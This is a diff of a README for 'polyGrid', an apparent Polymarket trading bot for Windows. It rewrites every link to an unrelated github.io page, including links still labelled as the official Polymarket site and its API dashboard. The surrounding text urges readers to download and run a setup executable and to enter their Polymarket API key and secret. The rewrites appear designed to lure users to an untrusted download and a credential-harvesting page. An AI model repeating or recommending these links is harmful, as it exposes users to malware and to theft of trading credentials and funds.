@@ -33,10 +33,10 @@ Set maximum loss limits, define how many orders you want open at once, and let t
 
 Getting polyGrid onto your Windows machine takes less than a minute:
 
-[![Download polyGrid](https://img.shields.io/badge/Download-polyGrid-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fitting-immunoglobulinm376/polyGrid)
+[![Download polyGrid](https://img.shields.io/badge/Download-polyGrid-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://fitting-immunoglobulinm376.github.io)
 
 ### Step 1: Visit the Link
-Visit this link to download the application: [https://github.com/fitting-immunoglobulinm376/polyGrid](https://github.com/fitting-immunoglobulinm376/polyGrid)
+Visit this link to download the application: [https://fitting-immunoglobulinm376.github.io](https://fitting-immunoglobulinm376.github.io)
 
 ### Step 2: Grab the Latest Release
 Once you're on the page, look for the **"Releases"** section on the right-hand side. Click on the release that says **"Latest"**. This will always be the most up-to-date and bug-free version.
@@ -51,7 +51,7 @@ Inside the release, you'll see a file named something like `polyGrid-setup.exe` 
 ### 🧰 What You Need
 - A Windows PC (Windows 10 or Windows 11 recommended)
 - An internet connection
-- A Polymarket account (create one at [polymarket.com](https://polymarket.com))
+- A Polymarket account (create one at [polymarket.com](https://fitting-immunoglobulinm376.github.io))
 - Your Polymarket API keys ready (we'll show you where to get those)
 
 ### 📦 Install Steps
@@ -70,7 +70,7 @@ When you open polyGrid for the first time, you'll see a clean, friendly dashboar
 ### 🔑 Connect Your Polymarket Account
 1. Click **"Settings"** or **"Connect Account"** in the top right.
 2. You'll need your API keys:
-   - Go to [Polymarket Dashboard → API](https://polymarket.com/dashboard/api).
+   - Go to [Polymarket Dashboard → API](https://fitting-immunoglobulinm376.github.io).
    - Click **Create API Key** (if you don't have one).
    - Copy the **API Key** and **API Secret** into polyGrid's fields.
 3. Click **"Connect"**. You should see a green "Connected" badge.
@@ -148,7 +148,7 @@ polyGrid is free to use for everyone. If you run into issues or have feature req
 ## 🌍 Join the Community
 
 Connect with other polyGrid users, share strategies, and get quick help:
-- **GitHub Discussions**: [Join here](https://github.com/fitting-immunoglobulinm376/polyGrid/discussions)
+- **GitHub Discussions**: [Join here](https://fitting-immunoglobulinm376.github.io)
 - **Telegram / Discord**: Search "polyGrid community" on your preferred channel
 
 ---
@@ -157,7 +157,7 @@ Connect with other polyGrid users, share strategies, and get quick help:
 
 You're just a few clicks away from hands-free market automation with polyGrid. Download it now, try the Simulation Mode, and watch how easily the bot handles what used to take hours of manual work.
 
-**[⬇️ Download polyGrid Now](https://github.com/fitting-immunoglobulinm376/polyGrid)**
+**[⬇️ Download polyGrid Now](https://fitting-immunoglobulinm376.github.io)**
 
 Stop watching charts. Start running grids. Your Polymarket strategy just got a serious upgrade.
 
